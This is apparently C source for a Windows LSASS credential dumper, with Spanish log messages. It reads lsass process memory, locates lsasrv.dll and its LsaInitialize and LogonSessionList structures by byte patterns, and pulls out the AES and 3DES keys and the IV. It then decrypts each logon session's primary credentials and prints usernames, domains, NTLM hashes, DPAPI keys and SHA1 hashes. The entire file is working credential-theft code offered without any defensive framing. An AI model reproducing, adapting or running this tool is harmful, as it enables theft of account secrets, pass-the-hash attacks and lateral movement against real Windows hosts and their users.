#include "header.h"

unsigned char AesKey[16];
unsigned char DesKey[24];
unsigned char iv_content[16];

LPVOID SearchPattern(HANDLE hProcess, LPVOID baseAddress, BYTE pattern[], SIZE_T patternSize, SIZE_T moduleSize) {
 
    BYTE* buffer = (BYTE*)malloc(moduleSize);
    if (!buffer) {
        return;
    }

    if (!ReadProcessMemory(hProcess, baseAddress, buffer, moduleSize, NULL)) {
        free(buffer);
        return;
    }

    for (SIZE_T i = 0; i < moduleSize - patternSize; i++) {
        if (memcmp(buffer + i, pattern, patternSize) == 0) {
            free(buffer);
            return (i);
        }
    }
    printf("[+] Offset no encontrado\n");
    free(buffer);
    return;
}

SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void* memOut, int memOutLen) {
    SIZE_T bytesRead = 0;
    memset(memOut, 0, memOutLen);
    ReadProcessMemory(hLsass, addr, memOut, memOutLen, &bytesRead);
    return bytesRead;
}

ULONG DecryptCredentials(char* encrypedPass, DWORD encryptedPassLen, unsigned char* decryptedPass, ULONG decryptedPassLen) {
    
    BCRYPT_ALG_HANDLE hProvider, hDesProvider;
    BCRYPT_KEY_HANDLE hAes, hDes;
   
    ULONG result;
    NTSTATUS status;
    unsigned char initializationVector[16];

    memcpy(initializationVector, iv_content, sizeof(iv_content));
   
    if (encryptedPassLen % 8) {
        BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
        BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
        BCryptGenerateSymmetricKey(hProvider, &hAes, NULL, 0, AesKey, sizeof(AesKey), 0);
        status = BCryptDecrypt(hAes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, sizeof(initializationVector), decryptedPass, decryptedPassLen, &result, 0);
        if (status != 0) {
            return 0;
        }
        return result;
    }
    else {
        BCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
        BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, DesKey, sizeof(DesKey), 0);
        status = BCryptDecrypt(hDes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, 8, decryptedPass, decryptedPassLen, &result, 0);
        if (status != 0) {
            return 0;
        }
        return result;
    }
}


int main(int argc, wchar_t* argv[])
{
    HANDLE hToken_ls = NULL;
    hToken_ls = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, 864);

    ULONG returnLength;
    nt_PROCESS_BASIC_INFORMATION processInformations;
    NTSTATUS status = NtQueryInformationProcess(hToken_ls, ProcessBasicInformation, &processInformations, sizeof(processInformations), &returnLength);
    if (status != 0) {
        printf("Error al obtener la información del proceso: 0x%X\n", status);
        return 1;
    }

    PVOID pebBaseAddress = processInformations.PebBaseAddress, moduleaddress = NULL;
    PEB peb;
    PEB_LDR_DATA LdrData;
    LDR_DATA_TABLE_ENTRY moduleEntry;
    SIZE_T bytesRead, modulesize = 0;

    ReadProcessMemory(hToken_ls, pebBaseAddress, &peb, sizeof(PEB), &bytesRead);

    const wchar_t* lsa_string = L"lsasrv.dll";
    ReadProcessMemory(hToken_ls, peb.Ldr, &LdrData, sizeof(PEB_LDR_DATA), NULL);

    LIST_ENTRY* head = LdrData.InLoadOrderModuleList.Flink;
    LIST_ENTRY* current = head;


    do {
        if (!ReadProcessMemory(hToken_ls, current, &moduleEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL)) {
            printf("Fallo al leer el module entry.\n");
            break;
        }
        WCHAR moduleName[MAX_PATH] = { 0 };
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(hToken_ls, moduleEntry.BaseDllName.Buffer, &moduleName, moduleEntry.BaseDllName.Length, &bytesRead)) {
            printf("Fallo al leer el module name.\n");
        }
        else {
            if (_wcsicmp(moduleName, L"lsasrv.dll") == 0) {
                modulesize = moduleEntry.SizeOfImage;
                moduleaddress = moduleEntry.DllBase;

                break;
            }
        }
        current = moduleEntry.InLoadOrderLinks.Flink;
    } while (current != head);

    printf("[+] lsasrv.dll encontrado en la direccion: %p\n", moduleaddress);

    DWORD offsetLUIDs = 0x17, offsetUsername = 0x90, offsetDomain = 0xA0, offsetPassword = 0x108;
    WORD AES_OFFSET = 0x10, DES_OFFSET = 0x59, IV_OFFSET = 0x43;
    DWORD RIP_AES_Offset, RIP_DES_Offset, RIP_LogonSessionList_offset;
    PVOID keyPointer;
    DWORD RIP_IV_OFFSET;
    DWORD offsetLogonSessionList, offsetLsaInitialize;
    unsigned char tmp_iv[16];

    BYTE LsaInitialize_needle[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
    offsetLsaInitialize = SearchPattern(hToken_ls, moduleaddress, LsaInitialize_needle, sizeof(LsaInitialize_needle), modulesize);

    BYTE LogonSessionList_needle[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
    offsetLogonSessionList = SearchPattern(hToken_ls, moduleaddress, LogonSessionList_needle, sizeof(LogonSessionList_needle), modulesize);

    unsigned char* LsaInitialize = (unsigned char*)moduleaddress + offsetLsaInitialize;
    unsigned char* LogonSessionList = (unsigned char*)moduleaddress + offsetLogonSessionList;

    printf("[+] Direccion del LsaInitialize: 0x%p\n", LsaInitialize);
    printf("[+] Direccion del LogonSessionList : 0x%p\n", LogonSessionList);

    ReadFromLsass(hToken_ls, LsaInitialize + IV_OFFSET, &RIP_IV_OFFSET, 4);
    ReadFromLsass(hToken_ls, LsaInitialize + IV_OFFSET + 4 + RIP_IV_OFFSET, iv_content, 16);


    printf("[*] IV: ");
    for (int i = 0; i < 16; i++) {
        printf("%02x", iv_content[i]);
    }
    printf("\n");


    ReadFromLsass(hToken_ls, LsaInitialize + AES_OFFSET, &RIP_AES_Offset, 4);
    ReadFromLsass(hToken_ls, LsaInitialize + AES_OFFSET + 4 + RIP_AES_Offset, &keyPointer, sizeof(char*));
    nt_BCRYPT_HANDLE_KEY hAesKey, h3DesKey;
    nt_BCRYPT_KEY81 extractedAesKey, extracted3DesKey;




    ReadFromLsass(hToken_ls, keyPointer, &hAesKey, sizeof(nt_BCRYPT_HANDLE_KEY));
    ReadFromLsass(hToken_ls, hAesKey.key, &extractedAesKey, sizeof(nt_BCRYPT_KEY81));

    printf("[*] Clave AES: ");
    memcpy(AesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
    for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
        printf("%02x", AesKey[i]);
    }
    printf("\n");


    ReadFromLsass(hToken_ls, LsaInitialize - DES_OFFSET, &RIP_DES_Offset, 4);
    ReadFromLsass(hToken_ls, LsaInitialize - DES_OFFSET + 4 + RIP_DES_Offset, &keyPointer, sizeof(char*));

    ReadFromLsass(hToken_ls, keyPointer, &h3DesKey, sizeof(nt_BCRYPT_HANDLE_KEY));
    ReadFromLsass(hToken_ls, h3DesKey.key, &extracted3DesKey, sizeof(nt_BCRYPT_KEY81));

    printf("[*] Clave 3Des: ");
    memcpy(DesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
    for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
        printf("%02x", DesKey[i]);
    }
    printf("\n");


    ReadFromLsass(hToken_ls, LogonSessionList + offsetLUIDs, &RIP_LogonSessionList_offset, 4);
    LogonSessionList = LogonSessionList + offsetLUIDs + 4 + RIP_LogonSessionList_offset;

    //ULONGLONG start = NULL;
    ULONGLONG flink = 0;
    ReadFromLsass(hToken_ls, LogonSessionList, &flink, 8);


    while (flink != LogonSessionList) {
       
        //printf("\n");
        puts("\n==============Start==============");
        USHORT length = 0, cryptoblob_size = 0;
        LPWSTR username = NULL, domain = NULL;
        ULONGLONG  domain_pointer = 0, username_pointer = 0, credentials_pointer = 0, primaryCredentials_pointer = 0, cryptoblob_pointer = 0;

        ReadFromLsass(hToken_ls, flink + offsetUsername, &length, 2);
        username = (LPWSTR)malloc(length + 2);
        memset(username, 0, length + 2);
        ReadFromLsass(hToken_ls, flink + offsetUsername + 0x8, &username_pointer, 8);
        ReadFromLsass(hToken_ls, username_pointer, username, length);
        printf("[-->] Username: %S\n", username);

        ReadFromLsass(hToken_ls, flink + offsetDomain, &length, 2);
        domain = (LPWSTR)malloc(length + 2);
        memset(domain, 0, length + 2);
        ReadFromLsass(hToken_ls, flink + offsetDomain + 0x8, &domain_pointer, 8);
        ReadFromLsass(hToken_ls, domain_pointer, domain, length);
        printf("[-->] Domain: %S\n", domain);
 
        ReadFromLsass(hToken_ls, flink + offsetPassword, &credentials_pointer, 8);
        ReadFromLsass(hToken_ls, flink, &flink, 8);

        if (credentials_pointer == 0) {
            puts("==============End================");
            continue;
        }

        ReadFromLsass(hToken_ls, credentials_pointer + 0x10, &primaryCredentials_pointer, 8);
        ReadFromLsass(hToken_ls, primaryCredentials_pointer + 0x18, &cryptoblob_size, 2);

        ReadFromLsass(hToken_ls, primaryCredentials_pointer + 0x20, &cryptoblob_pointer, 8);
        unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
        ReadFromLsass(hToken_ls, cryptoblob_pointer, cryptoblob, cryptoblob_size);

        unsigned char passDecrypted[496];
        DecryptCredentials(cryptoblob, cryptoblob_size, passDecrypted, sizeof(passDecrypted));

        PPRIMARY_CREDENTIALS_10 primarycreds = &passDecrypted;
        printf("[-->] NTLM: ");
        for (int i = 0; i < LM_NTLM_HASH_LENGTH; i++) {
            printf("%02x", primarycreds->NtOwfPassword[i]);
        }
        printf("\n");
        printf("[-->] DPAPI: ");
        for (int i = 0; i < LM_NTLM_HASH_LENGTH; i++) {
            printf("%02x", primarycreds->DPAPIProtected[i]);
        }
        printf("\n");
        printf("[-->] SHA1: ");
        for (int i = 0; i < SHA_DIGEST_LENGTH; i++) {
            printf("%02x", primarycreds->ShaOwPassword[i]);
        }
        printf("\n");

        puts("==============End================");

       
        
    }
}